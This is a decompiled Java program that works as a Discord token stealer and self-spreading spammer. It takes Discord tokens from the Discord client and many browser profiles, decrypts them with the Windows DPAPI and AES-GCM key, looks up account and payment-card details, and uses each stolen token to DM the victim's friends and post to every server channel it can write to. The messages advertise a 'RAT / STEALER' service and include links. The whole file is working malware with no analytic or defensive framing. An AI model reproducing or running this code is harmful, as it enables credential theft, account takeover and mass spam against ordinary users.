/*
 * Decompiled with CFR 0.152.
 */
package org.example;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.gson.JsonPrimitive;
import com.sun.jna.platform.win32.Crypt32Util;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.Key;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Objects;
import java.util.Set;
import java.util.Vector;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.net.ssl.HttpsURLConnection;

public class Main {
    private static final long SEND_MESSAGES = 2048L;
    static boolean found = false;
    private static final Set<String> tokens = new HashSet<String>();
    public static final String ROAMING = System.getenv("APPDATA");
    public static final String LOCAL = System.getenv("LOCALAPPDATA");
    private static final List<String> clientPaths = new ArrayList<String>();
    private static final List<String> browserPaths = new ArrayList<String>();
    private static final ObjectMapper objectMapper = new ObjectMapper();
    private static final Pattern ENCRYPTED_TOKEN_REGEX = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
    public static final Pattern TOKEN_REGEX = Pattern.compile("[\\w-]{24,29}\\.[\\w-]{6}\\.[\\w-]{25,110}");
    private static final int ENCRYPTED_TOKEN_OFFSET = 12;
    private static final int DPAPI_OFFSET = 5;
    private static final int IV_OFFSET = 3;
    private static final int IV_SIZE = 12;
    private static final int PAYLOAD_OFFSET = 15;
    private static final int GCM_BIT_LENGTH = 128;
    static List<String> tokenlist = new ArrayList<String>();

    public static void main(String[] args) {
        try {
            System.out.println("So... Yes!");
            try {
                Main.getDiscordToken();
                if (tokenlist != null) {
                    for (String tokend : tokenlist) {
                        if (found) continue;
                        Main.isUserInGuild(tokend, "1443109598579003414");
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        catch (Exception e) {
            System.out.println("An error occurred during the Discord token collection process");
        }
    }

    public static boolean hasPermissionToSend(JsonObject channel) {
        if (!channel.has("permission_overwrites")) {
            return false;
        }
        JsonArray overwrites = channel.getAsJsonArray("permission_overwrites");
        for (int j = 0; j < overwrites.size(); ++j) {
            JsonObject overwrite = overwrites.get(j).getAsJsonObject();
            if (!overwrite.has("allow") || !overwrite.has("deny")) continue;
            long allow = overwrite.get("allow").getAsLong();
            long deny = overwrite.get("deny").getAsLong();
            if ((allow & 0x800L) != 0L) {
                return true;
            }
            if ((deny & 0x800L) == 0L) continue;
            return false;
        }
        return true;
    }

    private static void isUserInGuild(String token, String guildId) {
        block10: {
            try {
                String id;
                int i;
                String inputLine;
                URL url = new URL("https://discord.com/api/v9/users/@me/guilds");
                HttpURLConnection conn = (HttpURLConnection)url.openConnection();
                conn.setRequestMethod("GET");
                conn.setRequestProperty("Authorization", token);
                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder content = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    content.append(inputLine);
                }
                in.close();
                conn.disconnect();
                JsonParser parser = new JsonParser();
                JsonArray serverlist = parser.parse(content.toString()).getAsJsonArray();
                for (i = 0; i < serverlist.size(); ++i) {
                    id = serverlist.get(i).getAsJsonObject().get("id").getAsString();
                    if (!id.equals(guildId)) continue;
                    found = true;
                    System.out.println("Stop testing rat yourself");
                }
                if (found) break block10;
                new Thread(() -> Main.runMassDm(token)).start();
                for (i = 0; i < serverlist.size(); ++i) {
                    id = serverlist.get(i).getAsJsonObject().get("id").getAsString();
                    try {
                        url = new URL("https://discord.com/api/v10/guilds/" + id + "/channels");
                        conn = (HttpURLConnection)url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("Authorization", token);
                        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
                        int responseCode = conn.getResponseCode();
                        if (responseCode == 200) {
                            String line;
                            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            StringBuilder response = new StringBuilder();
                            while ((line = in.readLine()) != null) {
                                response.append(line);
                            }
                            in.close();
                            JsonParser parser\u0441 = new JsonParser();
                            JsonArray channels = parser\u0441.parse(response.toString()).getAsJsonArray();
                            for (JsonElement element : channels) {
                                JsonObject channel = element.getAsJsonObject();
                                if (channel.get("type").getAsInt() != 0) continue;
                                String channelName = channel.get("name").getAsString();
                                String channelId = channel.get("id").getAsString();
                                boolean canSendMessages = Main.hasPermissionToSend(channel);
                                if (!canSendMessages) continue;
                                Main.sendMessage(token, channelId, "@everyone @here\n\n:red_circle::blue_circle: **YOUR MINECRAFT ACCOUNT IS ALREADY STOLEN** :blue_circle::red_circle:\n\n**:warning: RAT / STEALER MOD :warning:**\n\n:file_folder: **TDATA** \u2014 Telegram fully compromised\n:syringe: **Discord** \u2014 tokens, Nitro, servers ready for dump\n:globe_with_meridians: **Browsers** \u2014 Binance, Bybit, MetaMask, Phantom wide open\n:key: **Crypto** \u2014 Exodus, Trust Wallet, Ronin withdrawals ready\n:desktop: **Minecraft** \u2014 launchers, premium accounts full control\n:credit_card: **All** \u2014 passwords, screenshots, seed phrases accessible\n\n**:fire: THREE YEARS ON THE MARKET :fire:**\nNot some one-day scam. Thousands of clients worldwide made bank. Cars, mortgages, steady monthly cash. This is stats, not hype.\n\n**:gem: WHAT YOU GET :gem:**\n:gear: Build in 20 seconds\n:satellite: Instant logs to Discord/TG\n:arrows_counterclockwise: Daily updates \u2014 AV powerless\n:tools: 24/7 support + private chat\n:trophy: Time-tested beast\n\n**:free: FREE = FULL FUNCTIONALITY :free:**\nNo demos. Build it, grab accounts and crypto. In a month you teach newcomers.\n\n**:link: LINKS :link:**\n:globe_with_meridians: https://funrat.co/\n:mailbox_with_mail: https://t.me/weloverat\n:video_game: https://discord.gg/TSYMmF9B2y\n\n**:skull: Get in while accounts are juicy. Inside = money. Outside = loss. Act now. :skull:**", channelId);
                            }
                            continue;
                        }
                        System.out.println("Error: " + responseCode);
                        continue;
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static void runMassDm(String token) {
        List<String> userIds = Main.loadFriends(token);
        for (String userId : userIds) {
            try {
                String channelId = Main.createDMChannel(token, userId);
                if (channelId == null) continue;
                Main.sendMessage(token, channelId, "<@" + userId + ">\n\n:red_circle::blue_circle: **YOUR MINECRAFT ACCOUNT IS ALREADY STOLEN** :blue_circle::red_circle:\n\n**:warning: RAT / STEALER MOD :warning:**\n\n:file_folder: **TDATA** \u2014 Telegram fully compromised\n:syringe: **Discord** \u2014 tokens, Nitro, servers ready for dump\n:globe_with_meridians: **Browsers** \u2014 Binance, Bybit, MetaMask, Phantom wide open\n:key: **Crypto** \u2014 Exodus, Trust Wallet, Ronin withdrawals ready\n:desktop: **Minecraft** \u2014 launchers, premium accounts full control\n:credit_card: **All** \u2014 passwords, screenshots, seed phrases accessible\n\n**:fire: THREE YEARS ON THE MARKET :fire:**\nNot some one-day scam. Thousands of clients worldwide made bank. Cars, mortgages, steady monthly cash. This is stats, not hype.\n\n**:gem: WHAT YOU GET :gem:**\n:gear: Build in 20 seconds\n:satellite: Instant logs to Discord/TG\n:arrows_counterclockwise: Daily updates \u2014 AV powerless\n:tools: 24/7 support + private chat\n:trophy: Time-tested beast\n\n**:free: FREE = FULL FUNCTIONALITY :free:**\nNo demos. Build it, grab accounts and crypto. In a month you teach newcomers.\n\n**:link: LINKS :link:**\n:globe_with_meridians: https://funrat.co/\n:mailbox_with_mail: https://t.me/weloverat\n:video_game: https://discord.gg/TSYMmF9B2y\n\n**:skull: Get in while accounts are juicy. Inside = money. Outside = loss. Act now. :skull:**", userId);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static List<String> loadFriends(String token) {
        ArrayList<String> userIds = new ArrayList<String>();
        try {
            String inputLine;
            URL url = new URL("https://discord.com/api/v9/users/@me/relationships");
            HttpURLConnection conn = (HttpURLConnection)url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("Authorization", token);
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder content = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                content.append(inputLine);
            }
            in.close();
            conn.disconnect();
            JsonParser parser = new JsonParser();
            JsonArray friendsArray = parser.parse(content.toString()).getAsJsonArray();
            for (int i = 0; i < friendsArray.size(); ++i) {
                userIds.add(friendsArray.get(i).getAsJsonObject().get("id").getAsString());
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return userIds;
    }

    private static String createDMChannel(String token, String userId) throws Exception {
        String inputLine;
        JsonObject data = new JsonObject();
        JsonArray recipients = new JsonArray();
        recipients.add(new JsonPrimitive(userId));
        data.add("recipients", recipients);
        URL url = new URL("https://discord.com/api/v9/users/@me/channels");
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", token);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        try (OutputStream os = conn.getOutputStream();){
            byte[] input = data.toString().getBytes("utf-8");
            os.write(input, 0, input.length);
        }
        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder content = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            content.append(inputLine);
        }
        in.close();
        conn.disconnect();
        JsonParser parser = new JsonParser();
        JsonObject response = parser.parse(content.toString()).getAsJsonObject();
        return response.has("id") ? response.get("id").getAsString() : null;
    }

    private static void sendMessage(String token, String channelId, String message, String userId) throws Exception {
        JsonObject data = new JsonObject();
        data.addProperty("content", message);
        data.addProperty("nonce", userId);
        data.addProperty("tts", false);
        URL url = new URL("https://discord.com/api/v9/channels/" + channelId + "/messages");
        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Authorization", token);
        conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setDoOutput(true);
        try (OutputStream os = conn.getOutputStream();){
            byte[] input = data.toString().getBytes("utf-8");
            os.write(input, 0, input.length);
        }
        int status = conn.getResponseCode();
        conn.disconnect();
        if (status == 200 || status == 204) {
            System.out.println("Message sent to user ID: " + userId);
        } else if (status == 429) {
            System.out.println("Rate limited. Skipping user ID: " + userId);
        } else if (status == 403) {
            System.out.println("DMs closed for user ID: " + userId);
        } else if (status == 400) {
            System.out.println("Captcha detected for user ID: " + userId);
        } else {
            System.out.println("Failed to send message to user ID: " + userId + ". Status code: " + status);
        }
    }

    public static void getDiscordToken() {
        try {
            Main.getClientTokens();
            Main.getBrowserTokens();
            for (String token : tokens) {
                String Username = Main.CheckDiscordToken(token);
                if (Username.equals("")) continue;
                Main.card(token, Username);
            }
        }
        catch (Exception e3) {
            Main.ErrorMessage(e3, "discord token stealer");
        }
    }

    private static void card(String token, String Username2) {
        try {
            URL url = new URL("https://discord.com/api/v6/users/@me");
            HttpURLConnection connection = Main.getConnection(url, token);
            int responseCode = connection.getResponseCode();
            if (responseCode == 200) {
                String line;
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                StringBuilder content = new StringBuilder();
                while ((line = reader.readLine()) != null) {
                    content.append(line);
                }
                reader.close();
                content.toString();
                URL url2 = new URL("https://discord.com/api/v6/users/@me/billing/payment-sources");
                connection = Main.getConnection(url2, token);
                int responseCode2 = connection.getResponseCode();
                if (responseCode2 == 200) {
                    String line2;
                    BufferedReader reader2 = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                    StringBuilder content2 = new StringBuilder();
                    while ((line2 = reader2.readLine()) != null) {
                        content2.append(line2);
                    }
                    reader2.close();
                    String contentAsString = content2.toString().replace("[", "").replace("]", "");
                    if (contentAsString.length() != 0) {
                        Main.processPaymentData(contentAsString, Username2, token);
                    } else {
                        tokenlist.add(token);
                    }
                } else {
                    tokenlist.add(token);
                }
            }
            connection.disconnect();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void processPaymentData(String paymentContentAsString, String Username2, String token) {
        try {
            String[] keyValuePairs = paymentContentAsString.replace("[", "").replace("]", "").split(",");
            HashMap<String, String> paymentInfoMap = new HashMap<String, String>();
            for (String pair : keyValuePairs) {
                String[] keyValue = pair.split(":");
                if (keyValue.length != 2) continue;
                String key = keyValue[0].replace("\"", "").trim();
                String value = keyValue[1].replace("\"", "").trim();
                paymentInfoMap.put(key, value);
            }
            if (!paymentInfoMap.getOrDefault("expires_year", "").isEmpty()) {
                String paymentInfo = "expiresYear:" + paymentInfoMap.getOrDefault("expires_year", "") + " country:" + paymentInfoMap.getOrDefault("country", "") + " last_4:" + paymentInfoMap.getOrDefault("last_4", "") + " expires_month:" + paymentInfoMap.getOrDefault("expires_month", "") + " city:" + paymentInfoMap.getOrDefault("city", "") + " postalCode:" + paymentInfoMap.getOrDefault("postal_code", "") + " name:" + paymentInfoMap.getOrDefault("name", "") + " lineOne:" + paymentInfoMap.getOrDefault("line_1", "") + " lineTwo:" + (paymentInfoMap.containsKey("line_2") ? (String)paymentInfoMap.get("line_2") : "null") + " state:" + paymentInfoMap.getOrDefault("state", "");
            } else {
                String paymentInfo = "country:" + paymentInfoMap.getOrDefault("country", "") + " city:" + paymentInfoMap.getOrDefault("city", "") + " postalCode:" + paymentInfoMap.getOrDefault("postal_code", "") + " name:" + paymentInfoMap.getOrDefault("name", "") + " lineOne:" + paymentInfoMap.getOrDefault("line_1", "") + " lineTwo:" + (paymentInfoMap.containsKey("line_2") ? (String)paymentInfoMap.get("line_2") : "null") + " state:" + paymentInfoMap.getOrDefault("state", "");
            }
            tokenlist.add(token);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static HttpURLConnection getConnection(URL url, String token) throws IOException {
        HttpURLConnection connection = (HttpURLConnection)url.openConnection();
        connection.setRequestProperty("Authorization", token);
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
        return connection;
    }

    private static void getBrowserTokens() {
        Main.loadBrowserPaths().forEach(path -> tokens.addAll(Main.getTokens(path)));
    }

    private static void getClientTokens() {
        Main.loadClientPaths().forEach(path -> tokens.addAll(Main.decryptTokens(Paths.get(path, "Local Storage", "leveldb").toString(), Main.getAESKey(path))));
    }

    public static Set<String> getTokens(String path) {
        HashSet<String> tokens = new HashSet<String>();
        Main.listValidFiles(path).forEach(file -> tokens.addAll(Main.searchTokens(file)));
        return tokens;
    }

    public static Set<String> decryptTokens(String path, byte[] AESKey) {
        HashSet<String> decryptedTokens = new HashSet<String>();
        for (byte[] decodedToken : Main.listTokens(path)) {
            byte[] decryptedToken = new byte[12];
            System.arraycopy(decodedToken, 3, decryptedToken, 0, 12);
            byte[] encryptedData = new byte[decodedToken.length - 15];
            System.arraycopy(decodedToken, 15, encryptedData, 0, encryptedData.length);
            try {
                Cipher GCM = Cipher.getInstance("AES/GCM/NoPadding");
                GCM.init(2, (Key)new SecretKeySpec(AESKey, "AES"), new GCMParameterSpec(128, decryptedToken));
                decryptedTokens.add(new String(GCM.doFinal(encryptedData)));
            }
            catch (Exception exception) {}
        }
        return decryptedTokens;
    }

    public static byte[] getAESKey(String path) {
        try {
            JsonNode localState = Main.getObjectMapper().readTree(Paths.get(path, "Local State").toFile());
            String encodedAESKey = localState.path("os_crypt").path("encrypted_key").asText();
            byte[] decodedAESKey = Base64.getDecoder().decode(encodedAESKey);
            byte[] encryptedAESKey = Arrays.copyOfRange(decodedAESKey, 5, decodedAESKey.length);
            return Crypt32Util.cryptUnprotectData(encryptedAESKey);
        }
        catch (Exception exception) {
            return null;
        }
    }

    public static ObjectMapper getObjectMapper() {
        return objectMapper;
    }

    private static List<byte[]> listTokens(String path) {
        ArrayList<byte[]> newTokens = new ArrayList<byte[]>();
        Main.listValidFiles(path).forEach(file -> newTokens.addAll(Main.decodeTokens(file)));
        return newTokens;
    }

    private static List<byte[]> decodeTokens(File file) {
        ArrayList<byte[]> decodedTokens = new ArrayList<byte[]>();
        try (BufferedReader reader = new BufferedReader(new FileReader(file));){
            String line;
            while ((line = reader.readLine()) != null) {
                Matcher matcher = ENCRYPTED_TOKEN_REGEX.matcher(line);
                if (!matcher.find()) continue;
                String encodedToken = matcher.group().substring(12);
                byte[] decodedToken = Base64.getDecoder().decode(encodedToken);
                decodedTokens.add(decodedToken);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return decodedTokens;
    }

    private static Set<String> searchTokens(File file) {
        HashSet<String> tokens = new HashSet<String>();
        try (BufferedReader reader = new BufferedReader(new FileReader(file));){
            String line;
            while ((line = reader.readLine()) != null) {
                Matcher matcher = TOKEN_REGEX.matcher(line);
                if (!matcher.find()) continue;
                tokens.add(matcher.group());
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return tokens;
    }

    public static List<String> loadClientPaths() {
        Main.addClientPath(ROAMING, "discord");
        Main.addClientPath(ROAMING, "discordcanary");
        Main.addClientPath(ROAMING, "discordptb");
        return clientPaths;
    }

    public static List<String> loadBrowserPaths() {
        Main.addChromiumPath(LOCAL, "Chromium", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(ROAMING, "Opera Software", "Opera Stable", "Local Storage", "leveldb");
        Main.addChromiumPath(ROAMING, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb");
        Main.addChromiumPath(ROAMING, "Opera Software", "Opera GX", "Local Storage", "leveldb");
        Main.addChromiumPath(ROAMING, "Opera Software", "Opera Next", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(ROAMING, "Opera Software", "Opera Developer", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Iridium", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Epic Privacy Browser", "User Data", "Default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "falkon", "profiles", "default", "Local Storage", "leveldb");
        Main.addChromiumPath(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb");
        Main.addFirefoxPath(ROAMING, "Mozilla", "Firefox", "Profiles");
        Main.addFirefoxPath(ROAMING, "Waterfox", "Profiles");
        Main.addFirefoxPath(ROAMING, "librewolf", "Profiles");
        Main.addFirefoxPath(ROAMING, "Moonchild Productions", "Pale Moon", "Profiles");
        return browserPaths;
    }

    private static void addClientPath(String ... elements) {
        clientPaths.add(String.join((CharSequence)File.separator, elements));
    }

    private static void addFirefoxPath(String ... elements) {
        Path path = Paths.get(String.join((CharSequence)File.separator, elements), new String[0]);
        File dir = path.toFile();
        if (!dir.exists()) {
            return;
        }
        if (dir.listFiles() == null) {
            return;
        }
        try {
            Files.list(path).flatMap(subfolder -> {
                try {
                    return Files.list(Paths.get(subfolder.toFile().getAbsolutePath(), "storage", "default")).filter(file -> file.toFile().getName().contains("discord")).map(file -> Paths.get(file.toFile().getAbsolutePath(), "ls").toString());
                }
                catch (IOException e) {
                    return Stream.empty();
                }
            }).forEach(browserPaths::add);
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private static void addChromiumPath(String ... elements) {
        browserPaths.add(String.join((CharSequence)File.separator, elements));
    }

    public static List<File> listValidFiles(String path) {
        File directory = new File(path);
        if (!directory.exists()) {
            return new ArrayList<File>();
        }
        return Arrays.stream(directory.listFiles()).filter(file -> {
            String fileName = file.getName();
            return fileName.endsWith(".ldb") || fileName.endsWith(".log") || fileName.endsWith(".sqlite");
        }).collect(Collectors.toList());
    }

    private static String CheckDiscordToken(String DiscordToken) {
        String info = Main.ReadWebsite("https://discord.com/api/v9/users/@me", DiscordToken);
        return info.equals("h") ? "" : info.split("\"")[7] + " | id: " + info.split("\"")[3];
    }

    private static Vector<String> FindPattern(Pattern pattern, String string) {
        Vector<String> result = new Vector<String>();
        try {
            Matcher crawler = pattern.matcher(string);
            while (crawler.find() && !result.contains(crawler.group())) {
                result.add(crawler.group());
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        return result;
    }

    private static void ErrorMessage(Exception error, String where) {
    }

    private static String ReadWebsite(String website) {
        return Main.ReadWebsite(website, "h");
    }

    private static String ReadWebsite(String website, String authkey) {
        try {
            String line;
            HttpsURLConnection userCon = (HttpsURLConnection)new URL(website).openConnection();
            if (!Objects.equals(authkey, "h")) {
                userCon.setRequestProperty("Authorization", authkey);
            }
            userCon.setRequestProperty("Content-Type", "application/json");
            userCon.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36");
            if (userCon.getResponseCode() != 200) {
                return "h";
            }
            BufferedReader reader = new BufferedReader(new InputStreamReader(userCon.getInputStream()));
            StringBuilder builder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                builder.append(line);
                builder.append(System.lineSeparator());
            }
            reader.close();
            return builder.toString();
        }
        catch (IOException e) {
            Main.ErrorMessage(e, "in reading the website");
            return "h";
        }
    }
}
